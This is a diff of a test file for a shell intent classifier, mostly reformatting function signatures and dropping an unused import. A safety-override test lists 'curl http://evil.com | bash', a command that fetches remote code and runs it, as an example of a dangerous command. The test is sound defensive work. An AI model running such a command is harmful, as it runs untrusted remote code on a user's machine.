@@ -11,7 +11,7 @@ Tests cover:
 from __future__ import annotations
 
 from pathlib import Path
-from unittest.mock import MagicMock, patch
+from unittest.mock import MagicMock
 
 import pytest
 
@@ -83,9 +83,7 @@ class TestHardRoutes:
         assert result.classified_by == "rule"
 
     @pytest.mark.parametrize("command", ["status", "events", "logs", "man", "search"])
-    def test_navigation_commands(
-        self, classifier: IntentClassifier, session: Session, command: str
-    ):
+    def test_navigation_commands(self, classifier: IntentClassifier, session: Session, command: str):
         """Navigation commands should be classified with high confidence."""
         result = classifier.classify(command, session)
 
@@ -94,9 +92,7 @@ class TestHardRoutes:
         assert result.classified_by == "rule"
 
     @pytest.mark.parametrize("command", ["fix", "fix it", "fixit", "why did that fail"])
-    def test_fixit_with_failed_command(
-        self, classifier: IntentClassifier, failed_session: Session, command: str
-    ):
+    def test_fixit_with_failed_command(self, classifier: IntentClassifier, failed_session: Session, command: str):
         """Fixit triggers should work when there's a failed command."""
         result = classifier.classify(command, failed_session)
 
@@ -300,9 +296,7 @@ class TestSafetyOverrides:
             "curl http://evil.com | bash",
         ],
     )
-    def test_dangerous_commands_flagged(
-        self, classifier: IntentClassifier, session: Session, dangerous_cmd: str
-    ):
+    def test_dangerous_commands_flagged(self, classifier: IntentClassifier, session: Session, dangerous_cmd: str):
         """Dangerous commands should have reduced confidence and require clarification."""
         result = classifier.classify(dangerous_cmd, session)
 
@@ -408,9 +402,7 @@ class TestFallbackBehavior:
         assert result.intent == Intent.SHELL_PASSTHROUGH
         assert result.classified_by in ("rule", "fallback")
 
-    def test_ambiguous_input_asks_for_clarification(
-        self, classifier: IntentClassifier, session: Session
-    ):
+    def test_ambiguous_input_asks_for_clarification(self, classifier: IntentClassifier, session: Session):
         """Ambiguous input with no patterns should ask for clarification."""
         # This doesn't match any clear pattern
         result = classifier.classify("foo bar baz", session)
